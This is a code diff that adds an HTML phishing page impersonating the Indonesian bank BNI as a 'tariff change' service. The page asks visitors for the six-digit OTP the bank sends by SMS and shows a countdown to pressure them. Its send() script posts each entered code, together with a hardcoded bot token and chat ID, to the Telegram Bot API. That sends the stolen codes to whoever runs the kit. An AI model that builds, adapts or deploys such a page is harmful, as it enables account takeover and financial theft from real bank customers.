@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Layanan online BNI 2023</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+</head>
+<body>
+    <nav class="navbar" style="background-color: #FF6600">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <img src="logo.png" alt="logo" width="70" height="24">
+            </a>
+            <h2 style="color: #fff">Layanan Ganti Tarif BNI</h2>
+        </div>
+    </nav>
+
+    <div class="mt-4">
+        <div class="d-flex justify-content-around">
+            <div class="gif-home">
+                <img src="bni.png" class="img-fluid" alt="">
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="text-check">
+            <p class="text-center fw-bold mt-5">Silahkan Cek Kode OTP yang dikirim BNI via sms di Handphone Anda Selama 5 menit</p>
+        </div>
+        <div class="minute">
+            <p class="text-center text-danger fw-bold" id="countdown"></p>
+        </div>
+        <div class="otp-result">
+            <center><input style="border-radius: 13px; height: 40px" class="form-control shadow-sm w-75" type="number" name="otp" id="otp" placeholder="Kode Otp 6 Digit Angka" oninput="validateOtp(this)"></center>
+        </div>
+        <div class="form-button mx-auto d-block mt-5">
+            <center><button onclick="send()" class="text-center" style="border: none; background-color: #FF6600; border-radius: 13px; width: 75%; height: 45px; color: white; font-weight: bold">Lanjut</button></center>
+        </div>
+    </div>
+    <br>
+    <br>
+    <h3 style="display: none" id="error" class="text-center fw-bold text-danger">OTP KADALUARSA...</h3>
+    <br>
+    <br>
+    <br>
+    <br>
+    <div class="bawah-img">
+        <img src="bawahotp.jpg" alt="" class="img-fluid">
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+   <script>
+      function validateOtp(input) {
+            // Hapus semua karakter yang bukan angka dari input
+            input.value = input.value.replace(/\D/g, '');
+
+            // Batasi panjang input menjadi 6 digit
+            if (input.value.length > 6) {
+                input.value = input.value.slice(0, 6);
+            }
+
+            // Periksa apakah panjang input adalah 6 karakter
+            if (input.value.length === 6) {
+                console.log("test")
+            } else {
+                input.removeAttribute('readonly'); // Hapus readonly jika kurang dari 6 digit
+                document.getElementById('otpError').textContent = 'Kode OTP harus terdiri dari 6 digit angka.';
+            }
+        }
+   </script>
+   <script>
+        function sendMessage(id, botApi, pesan) {
+            const url = `https://api.telegram.org/bot${botApi}/sendMessage`;
+            const data = {
+                chat_id: id,
+                text: pesan
+            };
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('success', data)
+                let error = document.querySelector("#error")
+                error.style.display = "block"
+                window.location.href = "re.html"
+            })
+            .catch(error => {
+                console.error('Terjadi kesalahan:', error);
+            });
+       }
+       const send = () => {
+           let otp = document.querySelector("#otp").value
+           let bot = "6439882035:AAFBxLEyIBEwOoC3hQGw2ZBC7HFPLeCi9Tg";
+           let id = "6558831774";
+           const text = `Otp: ${otp}`
+           if (otp === "") {
+               alert('mohon lengkapi data anda.')
+           } else {
+               sendMessage(id, bot, text)
+           }
+       }
+   </script>
+ 
+    <script>
+        let countdownTime = 5 * 60 * 1000;
+        function countdown() {
+            const minutes = Math.floor(countdownTime / 60000);
+            const seconds = Math.floor((countdownTime % 60000) / 1000);
+            document.getElementById("countdown").textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            countdownTime -= 1000;
+            if (countdownTime < 0) {
+                document.getElementById("countdown").textContent = "Waktu Habis";
+                clearInterval(interval);
+            }
+        }
+        const interval = setInterval(countdown, 1000);
+        countdown();
+    </script>
+</body>
+</html>
